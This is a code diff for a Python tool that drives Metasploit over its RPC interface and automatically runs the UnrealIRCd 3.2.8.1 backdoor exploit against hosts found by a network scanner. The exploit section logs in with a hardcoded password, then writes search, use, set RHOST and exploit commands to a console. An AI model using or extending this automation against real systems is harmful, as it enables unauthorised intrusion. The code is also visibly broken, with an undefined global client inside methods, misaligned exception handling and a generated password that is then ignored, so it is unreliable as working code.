@@ -45,39 +45,57 @@ class Host:
 
 #pythons msfrpc is garbage and pymsfrpc wont import --_(*_*)_--
 class Msfrpc:
-
     def __init__(self,opts=[]):
         self.host = "127.0.0.1"
         self.port = 55552
         self.token = False
+        self.auth = False
         self.client = http.client.HTTPConnection(self.host,self.port)
+        self.console_id = ''
 
-    def msf_decode(bytes_dict):
-    #wanted to do this but an attriberror makes it not reliable
-    #return {str(a).decode('utf-8'):str(b).decode('utf-8') for a,b in bytes_dict.items()}
+    def encode(self, data):
+        return msgpack.packb(data)
+    def decode(self,data):
+        return msgpack.unpackb(data)
+
+    def bytes_to_dict(self,bytes_dict):
         out = {}
         for attrib,value in bytes_dict.items():
-            if type(value) is bool:
+            if type(value) is not bytes:
                 out.update({attrib.decode('utf-8'):value})
             else:
                 out.update({attrib.decode('utf-8'):value.decode('utf-8')})
         return out
 
-    def encode(self,data):
-        return msgpack.packb(data)
-    def decode(self,data):
-        return msgpack.unpackb(data)
+    def returnOne(self):
+        return 1
 
-    def call(self,meth,opts = []):
-        #can't use a token till we have one!
+    def call(self,meth,opts=[]):
+        if self.console_id:
+            opts.insert(0,self.console_id)
+
         if meth != "auth.login":
             opts.insert(0,self.token)
 
         opts.insert(0,meth)
         params = self.encode(opts)
-        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack" })
+        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack"})
         resp = self.client.getresponse()
-        return msf_decode(self.decode(resp.read())) 
+        if meth == 'console.write':
+            return c.wait()
+        else:
+            return self.bytes_to_dict(self.decode(resp.read()))
+
+    def wait(self):
+        res = c.call('console.read',[])
+        print(res)
+        if res['busy'] == False:
+            time.sleep(3)
+        while res['busy'] == True:
+            time.sleep(1)
+            res = c.call('console.read',[])
+            print(res)
+        return res
 
 #has a flexible network scanner and parses data
 #to format which is useful for metasploit
@@ -183,36 +201,33 @@ class Exploit:
         password_length = 8
         r = random.SystemRandom()
         self.msf_pass = ''.join([r.choice(chars) for i in range(password_length)])
-        #start msfrpc, unfortunately msfrpcd is not working properly.
-        # msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc Pass=" + self.msf_pass + "'","&"]
-        '''possible solution from trustwave:
-         To automate both database connections and starting the msfrpc server inside 
-         Metasploit we can create a rc file, 
-         a file full of commands that we want Metasploit to run automatically. 
-         Let's create our file and name it setup.rc:
-        '''
         msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc'"]
         subprocess.Popen(msfrpcd_init_cmd,shell=True,stdout=subprocess.PIPE)
         #login
-        self.client = Msfrpc({})
-        self.token = self.client.call('auth.login',['msf',self.msf_pass])
-        #create console
-        self.console_id = self.client.call('console.create')
+        c = Msfrpc({})
+        c.auth = c.call('auth.login',['msf','abc123'])
+        print(c.auth)
+        c.token = c.auth['token']
+        c.console_id = c.call('console.create')['id']
 
     def exploit(self, host):
         #search for equivalent exploit
-        self.client.call()
-        #choose that exploit
-        self.client.call()
-        #fill out options for exploit
-        with self.client.call() as result:
-            while result['busy'] == True:
-                time.sleep(1)
-        #execute
-        client.call()
-        #keep session in background
-        msf_cmd = 'msfconsole -x "use exploit/unix/irc/'+host.exploits[0]+\
-        ';set RHOST 10.10.10.2; exploit;"'
+        try:
+            print(c.console_id)
+            c.call('console.read',[])
+            search_res = c.call('console.write',['search unreal_ircd_3281_backdoor\n'])['data'].split()
+            print(search_res)
+            exp_path = [line.split()[0] for line in search_res if 'exploit' in line][0]
+            c.call('console.write',['use '+exp_path+'\n'])
+            c.call('console.write',['show options\n'])
+            c.call('console.write',['set RHOST '+host.ip_addr+'\n'])
+            c.call('console.write',['exploit\n'])
+            c.call('console.destroy',[])
+            print('done.')
+    except Exception as e:
+            print(e)
+            c.call('console.destroy',[])
+            exit(1)
         #output = subprocess.Popen(msf_cmd.split())
         #print(output)
 
